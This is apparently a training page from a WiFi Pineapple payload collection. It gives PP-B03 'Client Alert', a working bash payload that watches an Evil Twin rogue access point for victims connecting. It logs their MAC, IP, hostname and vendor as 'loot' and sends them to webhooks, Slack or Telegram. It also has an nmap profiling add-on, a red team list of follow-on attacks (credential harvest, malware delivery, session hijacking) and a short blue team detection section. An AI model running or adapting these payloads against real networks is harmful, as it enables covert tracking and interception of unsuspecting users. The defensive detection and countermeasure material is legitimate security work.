# PP-B03: Client Alert

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-B03 |
| **Name** | Client Alert |
| **Difficulty** | Basic |
| **Type** | Alert |
| **Purpose** | Notify when clients connect to Evil Twin |
| **MITRE ATT&CK** | T1557 (Adversary-in-the-Middle) |

## What This Payload Does

Monitors the Evil Twin access point and alerts when new clients connect. This provides real-time awareness during rogue AP operations.

---

## Understanding Client Connections

```
┌─────────────────────────────────────────────────────────────┐
│              CLIENT CONNECTION FLOW                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   VICTIM DEVICE              EVIL TWIN AP                   │
│        │                          │                          │
│        │──── Probe Request ──────►│                          │
│        │     "Looking for X"      │                          │
│        │                          │                          │
│        │◄─── Probe Response ──────│                          │
│        │     "I am X!"            │                          │
│        │                          │                          │
│        │──── Auth Request ───────►│                          │
│        │                          │                          │
│        │◄─── Auth Response ───────│                          │
│        │                          │                          │
│        │──── Association Req ────►│                          │
│        │                          │                          │
│        │◄─── Association Resp ────│ ← CLIENT NOW CONNECTED   │
│        │                          │                          │
│        │◄───► DHCP Exchange ◄────►│ ← CLIENT GETS IP        │
│        │                          │                          │
│   =================================================          │
│   AT THIS POINT: All traffic flows through our AP           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-B03
# Name: Client Alert
# Description: Monitor and alert on client connections
# Author: Security Training
#

# ============================================
# CONFIGURATION
# ============================================
AP_INTERFACE="wlan0"           # Interface running hostapd
DHCP_LEASES="/tmp/dnsmasq.leases"
ALERT_WEBHOOK="http://your-server/webhook"
CHECK_INTERVAL=5               # seconds
KNOWN_CLIENTS="/tmp/known_clients.txt"

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-b03.log"
LOOT_DIR="/sd/loot/clients"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# ============================================
# INITIALIZATION
# ============================================
log "Starting PP-B03: Client Alert"

# Create directories
mkdir -p "$LOOT_DIR"

# Initialize known clients file
> "$KNOWN_CLIENTS"

# ============================================
# CLIENT MONITORING FUNCTIONS
# ============================================

# Get connected clients from hostapd
get_hostapd_clients() {
    if [ -S /var/run/hostapd/wlan0 ]; then
        # Using hostapd_cli if available
        hostapd_cli -i "$AP_INTERFACE" all_sta 2>/dev/null | grep -oE "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}"
    elif [ -f /proc/net/arp ]; then
        # Fallback to ARP table
        cat /proc/net/arp | awk 'NR>1 && $6=="'$AP_INTERFACE'"{print $4}'
    fi
}

# Get clients from DHCP leases
get_dhcp_clients() {
    if [ -f "$DHCP_LEASES" ]; then
        # Format: timestamp mac ip hostname clientid
        awk '{print $2":"$3":"$4}' "$DHCP_LEASES"
    fi
}

# Check if client is new
is_new_client() {
    local mac="$1"
    if grep -q "^$mac$" "$KNOWN_CLIENTS" 2>/dev/null; then
        return 1  # Not new
    else
        echo "$mac" >> "$KNOWN_CLIENTS"
        return 0  # New client
    fi
}

# Get client details from DHCP
get_client_details() {
    local mac="$1"
    if [ -f "$DHCP_LEASES" ]; then
        grep -i "$mac" "$DHCP_LEASES" | awk '{print "IP:"$3" Hostname:"$4}'
    else
        echo "No details available"
    fi
}

# OUI lookup (first 3 bytes of MAC)
get_vendor() {
    local mac="$1"
    local oui=$(echo "$mac" | cut -d: -f1-3 | tr '[:lower:]' '[:upper:]' | tr ':' '-')

    # Common OUI prefixes
    case "$oui" in
        "00-50-F2"|"00-0D-3A") echo "Microsoft" ;;
        "00-03-93"|"00-24-36") echo "Apple" ;;
        "00-1A-11"|"00-21-6A"|"3C-D9-2B") echo "Google" ;;
        "00-1E-C2"|"00-1C-BF") echo "Samsung" ;;
        "00-26-B0"|"60-F1-89") echo "Huawei" ;;
        "B4-F1-DA"|"00-22-FB") echo "Cisco" ;;
        *) echo "Unknown" ;;
    esac
}

# Send alert
send_alert() {
    local mac="$1"
    local details="$2"
    local vendor=$(get_vendor "$mac")
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    log "NEW CLIENT: $mac ($vendor) - $details"

    # LED Alert - triple blink
    if [ -f /sys/class/leds/pineapple:blue:system/brightness ]; then
        for i in 1 2 3; do
            echo 1 > /sys/class/leds/pineapple:blue:system/brightness
            sleep 0.2
            echo 0 > /sys/class/leds/pineapple:blue:system/brightness
            sleep 0.2
        done
    fi

    # Webhook notification
    if [ -n "$ALERT_WEBHOOK" ] && [ "$ALERT_WEBHOOK" != "http://your-server/webhook" ]; then
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{\"event\":\"new_client\",\"mac\":\"$mac\",\"vendor\":\"$vendor\",\"details\":\"$details\",\"time\":\"$timestamp\"}" \
            2>/dev/null
    fi

    # Log to loot file
    echo "$timestamp | $mac | $vendor | $details" >> "$LOOT_DIR/clients.log"
}

# ============================================
# MAIN MONITORING LOOP
# ============================================
log "Monitoring for new clients on $AP_INTERFACE..."

while true; do
    # Method 1: Check hostapd/ARP for connected clients
    for mac in $(get_hostapd_clients); do
        if is_new_client "$mac"; then
            details=$(get_client_details "$mac")
            send_alert "$mac" "$details"
        fi
    done

    # Method 2: Check DHCP leases for clients with IPs
    while IFS=':' read -r mac ip hostname; do
        if [ -n "$mac" ] && is_new_client "$mac"; then
            send_alert "$mac" "IP:$ip Hostname:$hostname"
        fi
    done < <(get_dhcp_clients)

    sleep $CHECK_INTERVAL
done
```

---

## Line-by-Line Breakdown

### Client Detection Methods

#### Method 1: hostapd_cli
```bash
hostapd_cli -i "$AP_INTERFACE" all_sta
```
- Queries hostapd daemon directly
- Returns list of associated stations
- Most reliable method

#### Method 2: ARP Table
```bash
cat /proc/net/arp | awk 'NR>1 && $6=="wlan0"{print $4}'
```
- Parses kernel ARP cache
- Shows all devices that have communicated
- Fallback if hostapd_cli unavailable

#### Method 3: DHCP Leases
```bash
awk '{print $2":"$3":"$4}' /tmp/dnsmasq.leases
```
- Shows clients that obtained IP via DHCP
- Includes hostname if provided by client
- Lease file format: `timestamp mac ip hostname clientid`

### OUI Vendor Lookup
```bash
oui=$(echo "$mac" | cut -d: -f1-3 | tr '[:lower:]' '[:upper:]')
```
The first 3 bytes of a MAC address identify the manufacturer:
- `00:50:F2` = Microsoft
- `00:03:93` = Apple
- `3C:D9:2B` = Google

---

## DHCP Lease File Format

```
# /tmp/dnsmasq.leases
1703772600 aa:bb:cc:dd:ee:ff 192.168.1.100 Johns-iPhone 01:aa:bb:cc:dd:ee:ff
1703772650 11:22:33:44:55:66 192.168.1.101 DESKTOP-ABC *
```

| Field | Description |
|-------|-------------|
| 1703772600 | Lease expiry (Unix timestamp) |
| aa:bb:cc:dd:ee:ff | Client MAC address |
| 192.168.1.100 | Assigned IP address |
| Johns-iPhone | Client hostname |
| 01:aa:bb:cc:dd:ee:ff | Client ID (usually MAC) |

---

## Enhanced Version: Full Client Profiling

```bash
#!/bin/bash
# Enhanced client profiling

profile_client() {
    local ip="$1"
    local mac="$2"
    local profile_file="$LOOT_DIR/${mac//:/}.profile"

    echo "=== Client Profile ===" > "$profile_file"
    echo "MAC: $mac" >> "$profile_file"
    echo "IP: $ip" >> "$profile_file"
    echo "First Seen: $(date)" >> "$profile_file"

    # Fingerprint via nmap
    echo "" >> "$profile_file"
    echo "=== OS Detection ===" >> "$profile_file"
    nmap -O -Pn "$ip" 2>/dev/null >> "$profile_file"

    # Open ports
    echo "" >> "$profile_file"
    echo "=== Open Ports ===" >> "$profile_file"
    nmap -F -Pn "$ip" 2>/dev/null | grep "open" >> "$profile_file"

    # HTTP probe
    echo "" >> "$profile_file"
    echo "=== Web Services ===" >> "$profile_file"
    curl -sI "http://$ip" 2>/dev/null | head -5 >> "$profile_file"

    log "Profile saved: $profile_file"
}
```

---

## Integration with PineAP

PineAP is the Pineapple's built-in evil twin system:

```bash
# Check PineAP status
cat /tmp/pineap.log

# Enable PineAP via API
curl -s "http://172.16.42.1:1471/api/pineap/enable" \
    -H "Authorization: Bearer $TOKEN"

# Get connected clients
curl -s "http://172.16.42.1:1471/api/pineap/clients" \
    -H "Authorization: Bearer $TOKEN"
```

---

## Alert Destinations

### Slack Integration
```bash
send_slack_alert() {
    local mac="$1"
    local vendor="$2"

    curl -X POST -H 'Content-type: application/json' \
        --data "{
            \"text\": \"New client connected!\",
            \"attachments\": [{
                \"color\": \"#36a64f\",
                \"fields\": [
                    {\"title\": \"MAC\", \"value\": \"$mac\", \"short\": true},
                    {\"title\": \"Vendor\", \"value\": \"$vendor\", \"short\": true}
                ]
            }]
        }" \
        https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK
}
```

### Telegram Bot
```bash
send_telegram_alert() {
    local message="$1"
    local bot_token="YOUR_BOT_TOKEN"
    local chat_id="YOUR_CHAT_ID"

    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
        -d "chat_id=$chat_id&text=$message"
}
```

### Email via SMTP
```bash
send_email_alert() {
    local subject="$1"
    local body="$2"

    echo "$body" | sendmail -t <<EOF
To: alerts@example.com
Subject: Pineapple: $subject

$body
EOF
}
```

---

## Red Team Perspective

### Client Intelligence Value
| Information | Use |
|-------------|-----|
| Hostname | Identify user/device type |
| MAC Vendor | Device manufacturer |
| IP Address | Network targeting |
| Connection time | Usage patterns |
| Device type | Exploit selection |

### Exploitation After Connection
Once a client connects to Evil Twin:
1. **DNS Spoofing** - Redirect to phishing pages
2. **Traffic Capture** - Log all HTTP data
3. **Credential Harvest** - Capture portal logins
4. **Malware Delivery** - Serve malicious downloads
5. **Session Hijacking** - Steal cookies

---

## Blue Team Perspective

### Detection Methods

```bash
# Detect rogue APs with same SSID
iwlist wlan0 scan | grep -E "ESSID|Address" | paste - - | sort | uniq -d

# Monitor for excessive DHCP requests
tcpdump -i eth0 port 67 -c 100 2>/dev/null | grep -c "DHCP"
```

### Indicators of Evil Twin
1. **Duplicate SSIDs** with different BSSIDs
2. **Unexpected signal strength** changes
3. **New APs** appearing suddenly
4. **Clients disconnecting** from legitimate AP

### Sigma Rule
```yaml
title: Evil Twin Access Point Detection
status: experimental
description: Detects potential evil twin AP activity
logsource:
    product: wireless_controller
detection:
    selection:
        - duplicate_ssid: true
        - new_bssid: true
    condition: selection
level: high
tags:
    - attack.collection
    - attack.t1557
```

### Countermeasures
1. **802.1X/EAP** - Certificate-based authentication
2. **WPA3-SAE** - Resistant to evil twin
3. **WIDS** - Wireless Intrusion Detection
4. **Client isolation** - Prevent lateral movement
5. **VPN** - Encrypt all traffic regardless of AP

---

## Practice Exercises

### Exercise 1: Hostname Tracking
Log all unique hostnames seen over 24 hours.

### Exercise 2: Device Type Detection
Use HTTP User-Agent strings to identify device types.

### Exercise 3: Geographic Tracking
If clients have GPS, can you capture location data?

---

## Payload File

Save as `PP-B03_Client_Alert.sh`:

```bash
#!/bin/bash
# PP-B03: Client Alert (Compact)
LEASES="/tmp/dnsmasq.leases"
KNOWN="/tmp/known_clients.txt"
> "$KNOWN"
while true; do
    [ -f "$LEASES" ] && while read ts mac ip host cid; do
        grep -q "$mac" "$KNOWN" || { echo "$mac" >> "$KNOWN"; echo "[NEW CLIENT] $mac - $ip - $host"; }
    done < "$LEASES"
    sleep 5
done
```

---

[← PP-B02 Handshake Alert](PP-B02_Handshake_Alert.md) | [Back to Basic Payloads](README.md) | [Next: PP-B04 Basic Scan →](PP-B04_Basic_Scan.md)
